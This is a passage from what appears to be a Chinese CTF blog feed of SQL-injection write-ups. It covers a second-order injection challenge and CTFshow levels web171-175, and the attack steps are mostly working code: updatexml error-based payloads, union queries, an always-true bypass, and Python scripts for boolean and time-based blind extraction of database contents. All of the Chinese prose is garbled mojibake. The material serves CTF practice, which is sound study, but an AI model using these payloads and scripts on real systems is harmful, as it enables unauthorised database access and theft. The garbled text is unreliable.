‡ç«™ç‚¹æ•°æ®åº“ä¸­ï¼Œç„¶åå†åœ¨æŸäº›å®é™…å°†è¯¥æ•°æ®å–å‡ºï¼Œä½¿å¾—æˆ‘ä»¬å†™å…¥çš„payloadæ‰§è¡Œã€‚</span><br><span class="line">å› æ­¤ï¼ŒSQLäºŒæ¬¡æ³¨å…¥ä¸€èˆ¬åˆ†ä¸º2æ­¥ï¼Œç¬¬ä¸€æ­¥å³å‘ç›®æ ‡ç«™ç‚¹çš„æ•°æ®åº“ä¸­æ’å…¥æ¶æ„æ•°æ®ï¼Œç¬¬äºŒæ­¥å³ä½¿å¾—æˆ‘ä»¬æ’å…¥çš„æ¶æ„æ•°æ®è¢«ç›®æ ‡ç«™ç‚¹æ‰€å¼•ç”¨ã€‚</span><br><span class="line">SQLäºŒæ¬¡æ³¨å…¥çš„å®ç°ï¼Œåœ¨ç¬¬ä¸€æ­¥è¦æ±‚æˆ‘ä»¬æ’å…¥çš„æ¶æ„æ•°æ®èƒ½å¤ŸæˆåŠŸå†™å…¥åˆ°ç›®æ ‡ç«™ç‚¹çš„æ•°æ®åº“ä¸­ï¼Œç«™ç‚¹å¯ä»¥å¯¹æˆ‘ä»¬å†™å…¥çš„æ¶æ„æ•°æ®è¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯æ•°æ®æœ¬èº«ä¸ä¼šè¢«ä¿®æ”¹ï¼Œä¹Ÿä¸ä¼šå› ä¸ºæ¶æ„çš„æ•°æ®è€Œæ‹’ç»æˆ‘ä»¬çš„å†™å…¥ï¼›ç¬¬äºŒæ­¥è¦æ±‚æˆ‘ä»¬çš„æ¶æ„æ•°æ®èƒ½å¤Ÿåœ¨æŸç§åº”ç”¨åœºæ™¯ä¸‹å–å‡ºï¼Œå¹¶ä¸”ä¸ä¼šå¯¹å…¶ç«™ç‚¹å†…éƒ¨çš„æ•°æ®è¿›è¡Œæ£€éªŒ</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰€ä»¥ä¹Ÿå°±æ˜¯æ»¡è¶³è¿™ä¸¤ä¸ªæ¡ä»¶å³å¯</span><br><span class="line"></span><br><span class="line">ç”¨æˆ·å‘æ•°æ®åº“æ’å…¥æ¶æ„æ•°æ®ï¼Œå³ä½¿åç«¯å¯¹è¯­å¥åšäº†è½¬ä¹‰ï¼Œå¦‚mysql_escape_stringã€mysql_real_escape_stringç­‰å‡½æ•°</span><br><span class="line"></span><br><span class="line">æ•°æ®åº“èƒ½å¤Ÿå°†æ¶æ„æ•°æ®å–å‡º</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæƒ…å†µç›¸ç¬¦</p><p>ç°åœ¨æ³¨å†Œé¡µé¢æ„é€ æ¶æ„çš„payload</p><p>fuzzå‘ç°uesrnameè¿™â€æ²¡è¿‡æ»¤</p><p>åœ¨æ³¨å†Œè´¦å·è¿™é‡Œusername è¿™å†™å…¥Gu0f3nâ€</p><p>ä¿®æ”¹å¯†ç è¿™å‘ç°æŠ¥é”™</p><p>çŒœæµ‹è¯­å¥ä¸º</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span>&quot;Gu0f3n&quot; &quot; and password=&#x27; 5134f78f6e827c2a7e8767020cf23cbf&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>åŒå¼•å·é—­åˆæœ‰æŠ¥é”™</p><p>å°è¯•æŠ¥é”™æ³¨å…¥</p><p>||ç”¨æ¥æ‹¼æ¥ å‘ç°ç©ºæ ¼ &#x2F;**&#x2F;åŒæ—¶è¢«è¿‡æ»¤äº†æ‹¬å·ç»•è¿‡ç©ºæ ¼</p><p>ç›´æ¥æŸ¥è¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: â€˜:article,flag,usersâ€™</p><p>æŸ¥åˆ—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: â€˜:flagâ€™</p><p>flagåœ¨userè¡¨é‡Œ</p><p>è¿™é‡Œæœ‰ä¸ªå‘</p><p>å› ä¸ºé™åˆ¶é•¿åº¦æ‰€ä»¥åˆ—åæ²¡æœ‰æ˜¾ç¤ºæ¸…æ¥šregexp(â€˜â€™^râ€™)</p><p>ç”¨æ¥æŠŠæƒ³è¦çš„åˆ—åç­›é€‰å‡ºæ¥andè¢«è¿‡æ»¤äº†ç”¨&amp;&amp;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;))),1))#</span><br><span class="line">#XPATH syntax error: &#x27;real_flag_1s_here&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;))),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: â€˜:name,pwd,email,real_flag_1s_hereâ€™</p><p><code>regexp</code> æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ“ä½œç¬¦ï¼Œé€šå¸¸ç”¨äºæ£€æŸ¥æŸä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç¬¦åˆæŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ã€‚</p><p>æ•´ä¸ª <code>regexp(&#39;^f&#39;)</code> çš„ä½œç”¨æ˜¯ç­›é€‰å‡º <strong>ä»¥å­—æ¯ <code>f</code> å¼€å¤´çš„å€¼</strong>ã€‚<code>^</code>ï¼šè¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: â€˜~flag{24b07aef-f8cc-4348-a482-12â€™</p><p>è¿‡æ»¤äº†substr mid ç­‰å‡½æ•° ç”¨reverseå‡½æ•°</p><p>åè½¬å³å¯<a href="https://tool.box3.cn/reverse.html">https://tool.box3.cn/reverse.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: â€˜~}c4d832e9db21-284a-8434-cc8f-feâ€™</p><p>åè½¬æ‹¼æ¥å³å¯</p><p>flag{24b07aef-f8cc-4348-a482-12bd9e238d4c}</p><p>é‡å¼€é¶æœºç”¨è„šæœ¬è¯•è¯•</p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_reg = <span class="string">&#x27;http://3c31d529-aa22-4bca-88f5-3fa5d38b3a16.node5.buuoj.cn:81//register.php&#x27;</span></span><br><span class="line">url_log = <span class="string">&#x27;http://3c31d529-aa22-4bca-88f5-3fa5d38b3a16.node5.buuoj.cn:81//login.php&#x27;</span></span><br><span class="line">url_change = <span class="string">&#x27;http://3c31d529-aa22-4bca-88f5-3fa5d38b3a16.node5.buuoj.cn:81//changepwd.php&#x27;</span></span><br><span class="line"></span><br><span class="line">pre = <span class="string">&#x27;Gu0f3n&quot;&#x27;</span></span><br><span class="line"><span class="comment"># é€†åºé—­åˆ</span></span><br><span class="line">suf = <span class="string">&quot;&#x27;)))),1))#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ­£åºé—­åˆ</span></span><br><span class="line"><span class="comment"># suf = &quot;&#x27;))),1))#&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#x27;</span></span><br><span class="line">s = <span class="built_in">list</span>(s)</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">name</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url=url_reg, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">name</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url=url_log, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changepwd</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;oldpass&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;newpass&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    kk = r.post(url=url_change, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;XPATH&#x27;</span> <span class="keyword">in</span> kk.text:</span><br><span class="line">        <span class="built_in">print</span>(kk.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="comment"># æ­£åº</span></span><br><span class="line">    <span class="comment"># paylaod = pre + &quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot; + i + suf</span></span><br><span class="line">    <span class="comment"># é€†åº</span></span><br><span class="line">    paylaod = pre + <span class="string">&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot;</span> + i + suf</span><br><span class="line">    register(paylaod)</span><br><span class="line">    login(paylaod)</span><br><span class="line">    changepwd()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ­£åºpayload</span></span><br><span class="line"><span class="comment"># paylaod = pre + &quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot; + i + &quot;&#x27;))),1))#&quot;</span></span><br><span class="line"><span class="comment"># é€†åºpayload</span></span><br><span class="line"><span class="comment"># paylaod = pre + &quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot; + i + &quot;&#x27;)))),1))#&quot;</span></span><br></pre></td></tr></table></figure><p>å…ˆæ­£åºåœ¨é€†åº</p><p>ä¹‹åæ‹¼æ¥ä¸€ä¸‹å°±å¯ä»¥å‡º</p><p>flag{95001f84-9ad6-499b-9a06-9c0d2e6b8d4c}</p><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>äºŒæ¬¡æ³¨å…¥ </p><p>ç®€ä»‹è¿™æœ‰å›æ˜¾</p><p>åŸç†ä¸€æ ·ï¼Œæ³¨å†Œé¡µé¢æ²¡æœ‰è¿‡æ»¤ ç›´æ¥ç›²çŒœè¡¨å’Œåˆ—ä¸ºflag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; union select flag from flag#</span><br></pre></td></tr></table></figure><p>flag{77a8ffbc-ad0e-4968-be7e-4c81898910a6}</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p><strong>æ³¨å…¥ç‚¹åœ¨password</strong> </p><p>æ›¿æ¢ä¸ºç©ºçš„æ˜¯select union or </p><p>æ­£å¸¸æ³¨å…¥å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> sqlåˆ·é¢˜ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow</title>
      <link href="/2024/08/08/CTFSHOW/"/>
      <url>/2024/08/08/CTFSHOW/</url>
      
        <content type="html"><![CDATA[<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>ç»™äº†æºç </p><p>é—­åˆå•å¼•å· è€Œä¸”å­—æ®µå¯ä»¥ç›´æ¥çœ‹å‡ºä¸‰åˆ—</p><p>çˆ†åº“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure><p>ctfshow_web</p><p>åˆ†æä¸‹ç»™çš„æºç </p><ol><li><strong>é€‰æ‹©å­—æ®µ</strong><ul><li><code>select username, password</code>: é€‰æ‹©<code>user</code>è¡¨ä¸­çš„<code>username</code>å’Œ<code>password</code>åˆ—ã€‚</li></ul></li><li><strong>æŒ‡å®šè¡¨</strong><ul><li><code>from user</code>: æŒ‡å®šæŸ¥è¯¢çš„æ•°æ®è¡¨ä¸º<code>user</code>ã€‚</li></ul></li><li><strong>æ¡ä»¶</strong><ul><li><code>where username !=&#39;flag&#39;</code>: æ¡ä»¶æ˜¯<code>username</code>ä¸ç­‰äº<code>&#39;flag&#39;</code>ã€‚è¿™ç¡®ä¿æŸ¥è¯¢ç»“æœä¸­ä¸åŒ…å«ç”¨æˆ·åä¸º<code>flag</code>çš„è®°å½•ã€‚</li><li><code>and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;</code>: æ¡ä»¶æ˜¯<code>id</code>ç­‰äºä»URLå‚æ•°<code>id</code>è·å–çš„å€¼ã€‚</li></ul></li><li><strong>é™åˆ¶ç»“æœ</strong><ul><li><code>limit 1</code>: é™åˆ¶æŸ¥è¯¢ç»“æœæœ€å¤šè¿”å›ä¸€æ¡è®°å½•ã€‚</li></ul></li></ol><p>å‚æ•°å¯æ§å¯ä»¥çŒœæµ‹ç”¨æˆ·åä¸ºflagçš„ç”¨æˆ·å°±æ˜¯æˆ‘ä»¬çš„ç­”æ¡ˆ</p><p>ä¸‡èƒ½å¯†ç ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥oræˆªæ–­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or username = &#x27;flag</span><br></pre></td></tr></table></figure><p>ctfshow{1ae89b71-537e-4704-9493-f90aa665f1c0}</p><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>æŸ¥çœ‹æºç </p><p>çœ‹åˆ°select.js</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">layui.<span class="title function_">use</span>(<span class="string">&#x27;form&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> form = layui.<span class="property">form</span>;</span><br><span class="line">  form.<span class="title function_">on</span>(<span class="string">&#x27;submit(*)&#x27;</span>, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> id = data.<span class="property">field</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> table = layui.<span class="property">table</span>;</span><br><span class="line">    table.<span class="title function_">reload</span>(<span class="string">&#x27;user_table&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&#x27;api/?id=&#x27;</span> + id</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// é˜»æ­¢è¡¨å•é»˜è®¤æäº¤è¡Œä¸º</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>**<code>form.on(&#39;submit(\*)&#39;, function(data)&#123; ... &#125;)</code>**ï¼šç›‘å¬è¡¨å•æäº¤äº‹ä»¶ï¼Œè·å–è¡¨å•å­—æ®µä¸­çš„<code>id</code>å€¼ï¼Œå¹¶é‡æ–°åŠ è½½è¡¨æ ¼æ•°æ®ã€‚</li></ul><p>æ³¨å…¥ç‚¹ä¸ºidå­—æ®µ å•å¼•å·é—­åˆ</p><p>å°è¯•ä¸Šä¸€å…³çš„payload</p><p>{â€œidâ€:â€26â€,â€usernameâ€:â€flagâ€,â€passwordâ€:â€flag_not_hereâ€}]}</p><p>å‘ç°ä¸åœ¨è¿™</p><p>è€å®æ³¨</p><p>å­—æ®µä¸º3ä½</p><p>çˆ†åº“å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure><p>{â€œidâ€:â€1â€,â€usernameâ€:â€ctfshow_webâ€,â€passwordâ€:â€3â€}]}</p><p>çˆ†è¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p>{â€œidâ€:â€1â€,â€usernameâ€:â€ctfshow_user,ctfshow_user2â€,â€passwordâ€:â€3â€}]}</p><p>passwordè¡¨æ²¡ä¸œè¥¿</p><p>ctfshow_user,ctfshow_user2çš„åˆ—ä¸€æ ·</p><p>id,username,password</p><p>çˆ†å€¼</p><p>åœ¨ç¬¬äºŒå¼ è¡¨é‡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,group_concat(id,username,password),3 from ctfshow_user2--+</span><br></pre></td></tr></table></figure><p>ctfshow{b7520f1e-a489-493c-aabb-e1e978bae8cc}</p><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>ä¾æ—§æ˜¯åœ¨apiè¿™ä¸ªæ¥å£</p><p>å¤šäº†ä¸€å¼ è¡¨3å…¶ä½™å’Œä¸Šä¸€å…³ä¸€æ ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,group_concat(id,username,password),3 from ctfshow_user3--+</span><br></pre></td></tr></table></figure><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>è¿™é‡Œåœ¨apiè·¯ç”±è¿™é‡Œæ²¡å›æ˜¾</p><p>ç›´æ¥çœ‹æ— è¿‡æ»¤æ³¨å…¥4æ¨¡å—</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœ‰è¿‡æ»¤çš„å­—ç¬¦å‹æ³¨å…¥ï¼Œæ›´æ”¹æ­£åˆ™è¡¨è¾¾å¼ <code>/flag|[0-9]/i</code>ï¼Œè¿”å›ç»“æœä¸­ä¸èƒ½æœ‰æ•°å­—</p><p>è€ƒè™‘ç›²æ³¨</p><p>æŠ“åŒ…æ¥å£æ˜¯api&#x2F;v4.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;lbw&#x27;,&#x27;xyz&#x27;) %23</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¨ç¨è§£é‡Šä¸‹å§</p><p>ç¼–å†™ç›²æ³¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># æå–å¸¸é‡</span></span><br><span class="line">PAYLOAD_TEMPLATE = <span class="string">&quot;0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;lbw&#x27;,&#x27;xyz&#x27;) %23&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://d0a608fb-8c33-4e69-abbc-5429035225b4.challenge.ctf.show/api/v4.php?id=&quot;</span></span><br><span class="line">ASCII_START = <span class="number">32</span></span><br><span class="line">ASCII_END = <span class="number">127</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_chr</span>(<span class="params">index: <span class="built_in">int</span>, offset: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    response = requests.get(URL + PAYLOAD_TEMPLATE.<span class="built_in">format</span>(index, offset))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lbw&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;xyz&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unexpected response content&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        start, end = ASCII_START, ASCII_END</span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            point = (start + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> test_chr(index, point):</span><br><span class="line">                start = point + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = point</span><br><span class="line">        flag += <span class="built_in">chr</span>(end)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">        <span class="comment"># å‡è®¾æˆ‘ä»¬çŸ¥é“flagçš„ç»“æŸå­—ç¬¦ï¼Œè¿™é‡Œå¯ä»¥è®¾ç½®é€€å‡ºæ¡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt; <span class="number">50</span>:  <span class="comment"># è¿™ä¸ªæ¡ä»¶å¯ä»¥æ ¹æ®å®é™…æƒ…å†µè°ƒæ•´</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    final_flag = find_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final flag: <span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment">#ctfshow&#123;fe9a4453-ad08-4e6f-a83c-bcc2aa982a77&#125;</span></span><br></pre></td></tr></table></figure><p>ctfshow{fe9a4453-ad08-4e6f-a83c-bcc2aa982a77}</p><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ä»€ä¹ˆéƒ½ä¸ä¼šè¿”å›</p><p>è€ƒè™‘æ—¶é—´ç›²æ³¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and sleep(2) %23</span><br></pre></td></tr></table></figure><p>å¯è¡Œ</p><p>ä¸Šä¸€å…³æ­¥éª¤ä¸€æ ·</p><p>ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸¸é‡</span></span><br><span class="line">CHAR_SET = <span class="string">&#x27;1234567890-_&#123;&#125;qwertyuiopasdfghjklzxcvbnm&#x27;</span>  <span class="comment"># å­—ç¬¦é›†</span></span><br><span class="line">BASE_URL = <span class="string">&#x27;http://80f58198-ee06-4a46-a2cc-3f2aea94e556.challenge.ctf.show/api/v5.php?id=&#123;&#125;&amp;page=1&amp;limit=1&#x27;</span></span><br><span class="line">DELAY_THRESHOLD = <span class="number">2</span>  <span class="comment"># å»¶è¿Ÿæ—¶é—´ï¼ˆç§’ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_correct_char</span>(<span class="params">position: <span class="built_in">int</span>, char: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;åˆ¤æ–­æŒ‡å®šå­—ç¬¦æ˜¯å¦åœ¨ç‰¹å®šä½ç½®&quot;&quot;&quot;</span></span><br><span class="line">    sql_payload = <span class="string">&quot;1&#x27; and if(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(&#123;&#125;),0) %23&quot;</span>.<span class="built_in">format</span>(position, char, DELAY_THRESHOLD)</span><br><span class="line">    url = BASE_URL.<span class="built_in">format</span>(sql_payload)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    requests.get(url)</span><br><span class="line">    elapsed_time = time.time() - start_time</span><br><span class="line">    <span class="keyword">return</span> elapsed_time &gt;= DELAY_THRESHOLD</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_flag</span>(<span class="params">max_length: <span class="built_in">int</span> = <span class="number">64</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;é€å­—ç¬¦åœ°æå– flag&quot;&quot;&quot;</span></span><br><span class="line">    extracted_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> CHAR_SET:</span><br><span class="line">            <span class="keyword">if</span> is_correct_char(pos, char):</span><br><span class="line">                extracted_flag += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Extracted flag so far: <span class="subst">&#123;extracted_flag&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> extracted_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    final_flag = extract_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final extracted flag: <span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment">#ctfshow&#123;7b9f5582-39db-4e99-bed6-9da1772ed2ba&#125;</span></span><br></pre></td></tr></table></figure><p>ctfshow{7b9f5582-39db-4e99-bed6-9da1772ed2ba}</p><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>è¿‡æ»¤äº†union select 